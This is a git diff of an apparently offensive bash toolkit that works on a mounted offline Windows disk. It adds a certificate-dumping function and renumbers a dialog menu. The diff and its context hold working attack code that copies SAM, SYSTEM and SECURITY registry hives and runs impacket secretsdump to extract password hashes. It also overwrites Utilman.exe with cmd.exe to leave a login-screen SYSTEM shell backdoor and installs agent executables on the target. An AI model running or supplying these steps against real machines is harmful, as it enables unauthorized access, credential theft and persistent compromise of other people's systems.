@@ -24,15 +24,15 @@ LOOT_FOLDER=$([ -d /home/p4p1-live/loot ] && echo '/home/p4p1-live/loot' || echo
 echo $LOOT_FOLDER
 
 function banner() {
-	echo -e "\e[31m               .-')            .-. .-')                                 ('-.  _  .-')   \e[0m"
-	echo -e "\e[31m              ( OO ).          \\  ( OO )                              _(  OO)( \\( -O )  \e[0m"
-	echo -e "\e[31m .-'),-----. (_)---\_)         ,--. ,--.  ,-.-')  ,--.      ,--.     (,------.,------.  \e[0m"
-	echo -e "\e[31m( OO'  .-.  '/    _ |          |  .'   /  |  |OO) |  |.-')  |  |.-')  |  .---'|   /\`. ' \e[0m"
-	echo -e "\e[31m/   |  | |  |\\  :\` \`.          |      /,  |  |  \\ |  | OO ) |  | OO ) |  |    |  /  | | \e[0m"
-	echo -e "\e[31m\\_) |  |\|  | '..\`''.)  (\`-.   |     ' _) |  |(_/ |  |\`-' | |  |\`-' |(|  '--. |  |_.' | \e[0m"
-	echo -e "\e[31m  \\ |  | |  |.-._)   \\ (OO  )_ |  .   \\  ,|  |_.'(|  '---.'(|  '---.' |  .--' |  .  '.' \e[0m"
-	echo -e "\e[31m   \`'  '-'  '\\       /,------.)|  |\\   \\(_|  |    |      |  |      |  |  \`---.|  |\\  \\  \e[0m"
-	echo -e "\e[31m     \`-----'  \`-----' \`------' \`--' '--'  \`--'    \`------'  \`------'  \`------'\`--' '--' \e[0m"
+    echo -e "\e[31m               .-')            .-. .-')                                 ('-.  _  .-')   \e[0m"
+    echo -e "\e[31m              ( OO ).          \\  ( OO )                              _(  OO)( \\( -O )  \e[0m"
+    echo -e "\e[31m .-'),-----. (_)---\_)         ,--. ,--.  ,-.-')  ,--.      ,--.     (,------.,------.  \e[0m"
+    echo -e "\e[31m( OO'  .-.  '/    _ |          |  .'   /  |  |OO) |  |.-')  |  |.-')  |  .---'|   /\`. ' \e[0m"
+    echo -e "\e[31m/   |  | |  |\\  :\` \`.          |      /,  |  |  \\ |  | OO ) |  | OO ) |  |    |  /  | | \e[0m"
+    echo -e "\e[31m\\_) |  |\|  | '..\`''.)  (\`-.   |     ' _) |  |(_/ |  |\`-' | |  |\`-' |(|  '--. |  |_.' | \e[0m"
+    echo -e "\e[31m  \\ |  | |  |.-._)   \\ (OO  )_ |  .   \\  ,|  |_.'(|  '---.'(|  '---.' |  .--' |  .  '.' \e[0m"
+    echo -e "\e[31m   \`'  '-'  '\\       /,------.)|  |\\   \\(_|  |    |      |  |      |  |  \`---.|  |\\  \\  \e[0m"
+    echo -e "\e[31m     \`-----'  \`-----' \`------' \`--' '--'  \`--'    \`------'  \`------'  \`------'\`--' '--' \e[0m"
 }
 
 function linux_hashcat_exp() {
@@ -138,17 +138,55 @@ function windows_boot_service_exp() {
     fi
 }
 
+function windows_certificate_dumper_exp() {
+    cp -r /mnt/Windows/System32/config/SOFTWARE /tmp/SOFTWARE
+    [ ! -d $LOOT_FOLDER/certs ] && mkdir -p $LOOT_FOLDER/certs/
+    CERT_PATHS=(
+        'Microsoft\SystemCertificates\ROOT\Certificates'
+        'Microsoft\SystemCertificates\CA\Certificates'
+        'Microsoft\SystemCertificates\TRUST\Certificates'
+        'Microsoft\SystemCertificates\TrustedPublisher\Certificates'
+        'Microsoft\EnterpriseCertificates\Root\Certificates'
+        'Policies\Microsoft\SystemCertificates\ROOT\Certificates'
+        'Policies\Microsoft\SystemCertificates\CA\Certificates'
+    )
+    mapfile -t BLOBS < <(
+        for CERT_PATH in "${CERT_PATHS[@]}"; do
+            hivexregedit --export /tmp/SOFTWARE "$CERT_PATH" 2> /dev/null | grep 'hex' | cut -d ':' -f2
+        done
+    )
+
+    for BLOB in "${BLOBS[@]}"; do
+        echo "$BLOB" | tr -d ' ,\\' | xxd -r -p > /tmp/cert.bin
+        OFFSET=$(xxd -p /tmp/cert.bin | tr -d '\n' | grep -bo '3082' | head -n1 | cut -d: -f1)
+        [ -z "$OFFSET" ] && continue
+        BYTE_OFFSET=$(( OFFSET / 2 ))
+        dd if=/tmp/cert.bin of=/tmp/cert.der bs=1 skip=$BYTE_OFFSET 2>/dev/null
+
+
+        NAME="$(openssl x509 -inform DER -in /tmp/cert.der -noout -subject 2>/dev/null | \
+            grep -oP '(?<=CN=)[^,]+' | tr ' ' '_' | tr -d '/')_$(md5sum /tmp/cert.der| cut -d' ' -f1)"
+        if [ -n "$NAME" ]; then
+            mv /tmp/cert.der "$LOOT_FOLDER/certs/${NAME}.cer"
+            echo -e "\e[32m[+]\e[0m Extracted: $NAME"
+        else
+            echo -e "\e[31m[!]\e[0m Failed to parse cert"
+        fi
+    done
+}
+
 function windows_exp() {
     while true; do
         SEL=$(dialog --title "What are you looking for?" \
             --menu "...." 20 70 15 \
             1 "r: Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
             2 "r: Dump the hashes to then hashcat them ^^" \
-            3 "w: Swap cmd.exe and utilman.exe" \
-            4 "rw: Secrets dump me baby right now" \
-            5 "rw: Registery HIVE Attacks! (requires: loot/reg/*.reg)" \
-            6 "rw: Install agent.exe on target (requires: loot/agent.exe)" \
-            7 "rw: Install agent.svc.exe on target(requires: loot/agent.svc.exe)" \
+            3 "r: Dump the certificates of the machine" \
+            4 "w: Swap cmd.exe and utilman.exe" \
+            5 "rw: Secrets dump me baby right now" \
+            6 "rw: Registery HIVE Attacks! (requires: loot/reg/*.reg)" \
+            7 "rw: Install agent.exe on target (requires: loot/agent.exe)" \
+            8 "rw: Install agent.svc.exe on target(requires: loot/agent.svc.exe)" \
             2>&1 >/dev/tty)
         EXIT_STATUS=$?
 
@@ -159,11 +197,12 @@ function windows_exp() {
 
         [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY; cp -r /mnt/Windows/System32/config/SOFTWARE $LOOT_FOLDER/SOFTWARE)
         [ $SEL = 2 ] && windows_hashcat_exp
-        [ $SEL = 3 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
-        [ $SEL = 4 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
-        [ $SEL = 5 ] && windows_registry_exp
-        [ $SEL = 6 ] && windows_user_login_exp
-        [ $SEL = 7 ] && windows_boot_service_exp
+        [ $SEL = 3 ] && windows_certificate_dumper_exp
+        [ $SEL = 4 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
+        [ $SEL = 5 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
+        [ $SEL = 6 ] && windows_registry_exp
+        [ $SEL = 7 ] && windows_user_login_exp
+        [ $SEL = 8 ] && windows_boot_service_exp
     done
 
     echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
